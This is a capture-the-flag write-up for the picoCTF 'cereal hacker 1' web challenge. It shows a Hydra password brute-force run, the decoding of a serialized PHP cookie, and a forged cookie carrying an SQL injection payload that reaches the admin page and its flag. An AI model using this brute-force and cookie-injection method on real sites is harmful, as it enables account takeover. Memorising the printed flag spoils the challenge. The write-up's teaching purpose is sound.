# cereal hacker 1
Web Exploitation, 450 points

## Description:
> Login as admin.


## Solution: 

The website redirects to a login page:

```console
root@kali:/media/sf_CTFs/pico/cereal_hacker_1# curl https://2019shell1.picoctf.com/problem/49879/ -I
HTTP/1.1 302 Found
Server: nginx
Date: Tue, 15 Oct 2019 09:21:55 GMT
Content-Type: text/html; charset=UTF-8
Connection: keep-alive
location: index.php?file=login
Strict-Transport-Security: max-age=0
root@kali:/media/sf_CTFs/pico/cereal_hacker_1# curl https://2019shell1.picoctf.com/problem/49879/ -L
<!DOCTYPE html>
<html>
<head>
<link href="https://stackpath.bootstrapcdn.com/bootstrap/4.3.1/css/bootstrap.min.css" rel="stylesheet" integrity="sha384-ggOyR0iXCbMQv3Xipma34MD+dH/1fQ784/j6cY/iJTQUOhcWr7x9JvoRxT2MZw1T" crossorigin="anonymous">
<link href="style.css" rel="stylesheet">
<script src="https://stackpath.bootstrapcdn.com/bootstrap/4.3.1/js/bootstrap.min.js" integrity="sha384-JjSmVgyd0p3pXB1rRibZUAYoIIy6OrQ6VrjIEaFf/nJGzIxFDsf4x0xIM+B07jRM" crossorigin="anonymous"></script>
</head>
        <body>
                <div class="container">
                        <div class="row">
                                <div class="col-sm-9 col-md-7 col-lg-5 mx-auto">
                                        <div class="card card-signin my-5">
                                                <div class="card-body">
                                                        <h5 class="card-title text-center">Sign In</h5>
                                                            <form class="form-signin" action="index.php?file=login" method="post">
                                                                <div class="form-label-group">
                                                                        <input type="text" id="user" name="user" class="form-control" placeholder="Username" required autofocus>
                                                                        <label for="user">Username</label>
                                                                </div>

                                                                <div class="form-label-group">
                                                                        <input type="password" id="pass" name="pass" class="form-control" placeholder="Password" required>
                                                                        <label for="pass">Password</label>
                                                                </div>

                                                                <button class="btn btn-lg btn-primary btn-block text-uppercase" type="submit">Sign in</button>
                                                        </form>
                                                </div>
                                        </div>
                                </div>
                        </div>
                </div>

        </body>
</html>
```

Since the URI for the login page is `index.php?file=login`, the first thing to try is path traversal. We can access an admin page via:

```console
root@kali:/media/sf_CTFs/pico/cereal_hacker_1# curl https://2019shell1.picoctf.com/problem/49879/index.php?file=admin
<!DOCTYPE html>
<html>
<head>
<link href="https://stackpath.bootstrapcdn.com/bootstrap/4.3.1/css/bootstrap.min.css" rel="stylesheet" integrity="sha384-ggOyR0iXCbMQv3Xipma34MD+dH/1fQ784/j6cY/iJTQUOhcWr7x9JvoRxT2MZw1T" crossorigin="anonymous">
<link href="style.css" rel="stylesheet">
<script src="https://stackpath.bootstrapcdn.com/bootstrap/4.3.1/js/bootstrap.min.js" integrity="sha384-JjSmVgyd0p3pXB1rRibZUAYoIIy6OrQ6VrjIEaFf/nJGzIxFDsf4x0xIM+B07jRM" crossorigin="anonymous"></script>
</head>

        <body>
                <div class="container">
                        <div class="row">
                                <div class="col-sm-9 col-md-7 col-lg-5 mx-auto">
                                        <div class="card card-signin my-5">
                                                <div class="card-body">
                                                        <h5 class="card-title text-center">You are not admin!</h5>
                                                        <form action="index.php" method="get">
                                                                <button class="btn btn-lg btn-primary btn-block text-uppercase" name="file" value="login" type="submit" onclick="document.cookie='user_info=; expires=Thu, 01 Jan 1970 00:00:18 GMT; domain=; path=/;'">Go back to login</button>
                                                        </form>
                                                </div>
                                        </div>
                                </div>
                        </div>
                </div>

        </body>

</html>
```

But not much more. SQL injection does not lead anywhere and no cookies to manipulate. Maybe the admin has a weak password?

First, I tried a dictionary attack on the admin username, and when that didn't work I moved to a list of the most common usernames together with the top 10K passwords using `Hydra`:

```console
root@kali:/media/sf_CTFs/pico/cereal_hacker_1# ~/utils/thc-hydra/hydra -L ~/utils/dictionaries/top-usernames-shortlist.txt -P ~/utils/dictionaries/10-million-password-list-top-10000.txt -f -F 2019shell1.picoctf.com -s 49879 http-post-form "/index.php?file=login:user=^USER^&pass=^PASS^:Invalid Login" -v -R
Hydra v8.7-dev (c) 2018 by van Hauser/THC - Please do not use in military or secret service organizations, or for illegal purposes.

[INFORMATION] reading restore file ./hydra.restore
[WARNING] options after -R are now honored (since v8.6)
Hydra (https://github.com/vanhauser-thc/thc-hydra) starting at 2019-10-04 08:22:29
[DATA] max 16 tasks per 1 server, overall 16 tasks, 170000 login tries (l:17/p:10000), ~10625 tries per task
[DATA] attacking http-post-form://2019shell1.picoctf.com:49879/index.php?file=login:user=^USER^&pass=^PASS^:Invalid Login
[VERBOSE] Resolving addresses ... [VERBOSE] resolving done
[STATUS] 8978.00 tries/min, 8978 tries in 00:01h, 161022 to do in 00:18h, 16 active
[STATUS] 3392.67 tries/min, 10178 tries in 00:03h, 159822 to do in 00:48h, 16 active
[STATUS] 1823.86 tries/min, 12767 tries in 00:07h, 157233 to do in 01:27h, 16 active
[STATUS] 1196.73 tries/min, 17951 tries in 00:15h, 152049 to do in 02:08h, 16 active
[STATUS] 912.06 tries/min, 28274 tries in 00:31h, 141726 to do in 02:36h, 16 active
[VERBOSE] Page redirected to http://:49879/index.php?file=login
[49879][http-post-form] host: 2019shell1.picoctf.com   login: guest   password: guest
[STATUS] attack finished for 2019shell1.picoctf.com (valid pair found)
1 of 1 target successfully completed, 1 valid password found
Hydra (https://github.com/vanhauser-thc/thc-hydra) finished at 2019-10-04 09:02:01
```

(Notice the `-f -F` flags which tell `Hydra` to stop scanning once it found a single match - the default is to test all combinations).

We can login with `guest:guest`, let's see what we get:

```console
root@kali:/media/sf_CTFs/pico/cereal_hacker_1# curl https://2019shell1.picoctf.com/problem/49879/index.php?file=login --data "user=guest&pass=guest" -v
*   Trying 3.15.247.173...
* TCP_NODELAY set
* Expire in 200 ms for 4 (transfer 0x5569d99fed10)
* Connected to 2019shell1.picoctf.com (3.15.247.173) port 443 (#0)
* ALPN, offering h2
* ALPN, offering http/1.1
* successfully set certificate verify locations:
*   CAfile: none
  CApath: /etc/ssl/certs
* TLSv1.3 (OUT), TLS handshake, Client hello (1):
* TLSv1.3 (IN), TLS handshake, Server hello (2):
* TLSv1.2 (IN), TLS handshake, Certificate (11):
* TLSv1.2 (IN), TLS handshake, Server key exchange (12):
* TLSv1.2 (IN), TLS handshake, Server finished (14):
* TLSv1.2 (OUT), TLS handshake, Client key exchange (16):
* TLSv1.2 (OUT), TLS change cipher, Change cipher spec (1):
* TLSv1.2 (OUT), TLS handshake, Finished (20):
* TLSv1.2 (IN), TLS handshake, Finished (20):
* SSL connection using TLSv1.2 / ECDHE-RSA-AES256-GCM-SHA384
* ALPN, server accepted to use http/1.1
* Server certificate:
*  subject: OU=Domain Control Validated; OU=PositiveSSL Wildcard; CN=*.picoctf.com
*  start date: Oct 26 00:00:00 2018 GMT
*  expire date: Nov  1 23:59:59 2020 GMT
*  subjectAltName: host "2019shell1.picoctf.com" matched cert's "*.picoctf.com"
*  issuer: C=GB; ST=Greater Manchester; L=Salford; O=COMODO CA Limited; CN=COMODO RSA Domain Validation Secure Server CA
*  SSL certificate verify ok.
> POST /problem/49879/index.php?file=login HTTP/1.1
> Host: 2019shell1.picoctf.com
> User-Agent: curl/7.64.0
> Accept: */*
> Content-Length: 21
> Content-Type: application/x-www-form-urlencoded
>
* upload completely sent off: 21 out of 21 bytes
< HTTP/1.1 302 Found
< Server: nginx
< Date: Tue, 15 Oct 2019 09:36:10 GMT
< Content-Type: text/html; charset=UTF-8
< Transfer-Encoding: chunked
< Connection: keep-alive
< Set-Cookie: user_info=TzoxMToicGVybWlzc2lvbnMiOjI6e3M6ODoidXNlcm5hbWUiO3M6NToiZ3Vlc3QiO3M6ODoicGFzc3dvcmQiO3M6NToiZ3Vlc3QiO30%253D; expires=Thu, 14-Nov-2019 09:36:10 GMT; Max-Age=2592000; path=/
< Location: index.php?file=login
< Strict-Transport-Security: max-age=0
<
<!DOCTYPE html>
<html>
<head>
<link href="https://stackpath.bootstrapcdn.com/bootstrap/4.3.1/css/bootstrap.min.css" rel="stylesheet" integrity="sha384-ggOyR0iXCbMQv3Xipma34MD+dH/1fQ784/j6cY/iJTQUOhcWr7x9JvoRxT2MZw1T" crossorigin="anonymous">
<link href="style.css" rel="stylesheet">
<script src="https://stackpath.bootstrapcdn.com/bootstrap/4.3.1/js/bootstrap.min.js" integrity="sha384-JjSmVgyd0p3pXB1rRibZUAYoIIy6OrQ6VrjIEaFf/nJGzIxFDsf4x0xIM+B07jRM" crossorigin="anonymous"></script>
</head>

        <body>
                <div class="container">
                        <div class="row">
                                <div class="col-sm-9 col-md-7 col-lg-5 mx-auto">
                                        <div class="card card-signin my-5">
                                                <div class="card-body">
                                                        <h5 class="card-title text-center">Sign In</h5>
                                                                                                                <form class="form-signin" action="index.php?file=login" method="post">
                                                                <div class="form-label-group">
                                                                        <input type="text" id="user" name="user" class="form-control" placeholder="Username" required autofocus>
                                                                        <label for="user">Username</label>
                                                                </div>

                                                                <div class="form-label-group">
                                                                        <input type="password" id="pass" name="pass" class="form-control" placeholder="Password" required>
                                                                        <label for="pass">Password</label>
                                                                </div>

                                                                <button class="btn btn-lg btn-primary btn-block text-uppercase" type="submit">Sign in</button>
                                                        </form>
                                                </div>
                                        </div>
                                </div>
                        </div>
                </div>

        </body>
* Connection #0 to host 2019shell1.picoctf.com left intact
</html>
```

We get a `user_info` cookie:
```
< Set-Cookie: user_info=TzoxMToicGVybWlzc2lvbnMiOjI6e3M6ODoidXNlcm5hbWUiO3M6NToiZ3Vlc3QiO3M6ODoicGFzc3dvcmQiO3M6NToiZ3Vlc3QiO30%253D; expires=Thu, 14-Nov-2019 09:36:10 GMT; Max-Age=2592000; path=/
```

Let's decode it:
```console
root@kali:/media/sf_CTFs/pico/cereal_hacker_1# node -e "console.log(decodeURIComponent('TzoxMToicGVybWlzc2lvbnMiOjI6e3M6ODoidXNlcm5hbWUiO3M6NToiZ3Vlc3QiO3M6ODoicGFzc3dvcmQiO3M6NToiZ3Vlc3QiO30%253D'));"
TzoxMToicGVybWlzc2lvbnMiOjI6e3M6ODoidXNlcm5hbWUiO3M6NToiZ3Vlc3QiO3M6ODoicGFzc3dvcmQiO3M6NToiZ3Vlc3QiO30%3D
root@kali:/media/sf_CTFs/pico/cereal_hacker_1# node -e "console.log(decodeURIComponent(decodeURIComponent('TzoxMToicGVybWlzc2lvbnMiOjI6e3M6ODoidXNlcm5hbWUiO3M6NToiZ3Vlc3QiO3M6ODoicGFzc3dvcmQiO3M6NToiZ3Vlc3Qi
O30%253D')));"
TzoxMToicGVybWlzc2lvbnMiOjI6e3M6ODoidXNlcm5hbWUiO3M6NToiZ3Vlc3QiO3M6ODoicGFzc3dvcmQiO3M6NToiZ3Vlc3QiO30=
root@kali:/media/sf_CTFs/pico/cereal_hacker_1# node -e "console.log(Buffer(decodeURIComponent(decodeURIComponent('TzoxMToicGVybWlzc2lvbnMiOjI6e3M6ODoidXNlcm5hbWUiO3M6NToiZ3Vlc3QiO3M6ODoicGFzc3dvcmQiO3M6NToiZ3Vlc3QiO30%253D')), 'base64').toString());"
O:11:"permissions":2:{s:8:"username";s:5:"guest";s:8:"password";s:5:"guest";}
```

After removing two layers of URL encoding and one later of base64 encoding, we get what looks like a serialized PHP object which represents the user. 

This object is easy to interpret:

```
O:11:"permissions": <-- Object, object name has 11 characters
    2: <-- Two attributes contained in object
        {
            s:8:"username"; s:5:"guest"; <-- Attribute name is string of length 8, value is string of length 5
            s:8:"password"; s:5:"guest"; <-- Attribute name is string of length 8, value is string of length 5
        }
```

Trying to change the username to `admin` doesn't work. However, using this cookie to perform an SQL injection does!

First, we manually change the serialized representation of the object:
```
O:11:"permissions":2:{s:8:"username";s:5:"admin";s:8:"password";s:24:"aaa' or password like '%";}
```

We encode the result:
```console
root@kali:/media/sf_CTFs/pico/cereal_hacker_1# node
> payload = `O:11:"permissions":2:{s:8:"username";s:5:"admin";s:8:"password";s:24:"aaa' or password like '%";}`
'O:11:"permissions":2:{s:8:"username";s:5:"admin";s:8:"password";s:24:"aaa\' or password like \'%";}'
> encodeURIComponent(encodeURIComponent(Buffer(payload).toString('base64')))
'TzoxMToicGVybWlzc2lvbnMiOjI6e3M6ODoidXNlcm5hbWUiO3M6NToiYWRtaW4iO3M6ODoicGFzc3dvcmQiO3M6MjQ6ImFhYScgb3IgcGFzc3dvcmQgbGlrZSAnJSI7fQ%253D%253D'
```

Finally, we send the cookie together with a request to tha admin page:

```console
root@kali:/media/sf_CTFs/pico/cereal_hacker_1# curl http://2019shell1.picoctf.com:49879/index.php?file=admin -H "Cookie: user_info=TzoxMToicGVybWlzc2lvbnMiOjI6e3M6ODoidXNlcm5hbWUiO3M6NToiYWRtaW4iO3M6ODoicGFzc3dvcmQiO3M6MjQ6ImFhYScgb3IgcGFzc3dvcmQgbGlrZSAnJSI7fQ%253D%253D" && echo
<!DOCTYPE html>
<html>
<head>
<link href="https://stackpath.bootstrapcdn.com/bootstrap/4.3.1/css/bootstrap.min.css" rel="stylesheet" integrity="sha384-ggOyR0iXCbMQv3Xipma34MD+dH/1fQ784/j6cY/iJTQUOhcWr7x9JvoRxT2MZw1T" crossorigin="anonymous">
<link href="style.css" rel="stylesheet">
<script src="https://stackpath.bootstrapcdn.com/bootstrap/4.3.1/js/bootstrap.min.js" integrity="sha384-JjSmVgyd0p3pXB1rRibZUAYoIIy6OrQ6VrjIEaFf/nJGzIxFDsf4x0xIM+B07jRM" crossorigin="anonymous"></script>
</head>

        <body>
                <div class="container">
                        <div class="row">
                                <div class="col-sm-9 col-md-7 col-lg-5 mx-auto">
                                        <div class="card card-signin my-5">
                                                <div class="card-body">
                                                        <h5 class="card-title text-center">Welcome to the admin page!</h5>
                                                        <h5 style="color:blue" class="text-center">Flag: picoCTF{0d040919669d2bc1501212f90450eb4c}</h5>
                                                </div>
                                        </div>
                                </div>
                        </div>
                </div>

        </body>

</html>
```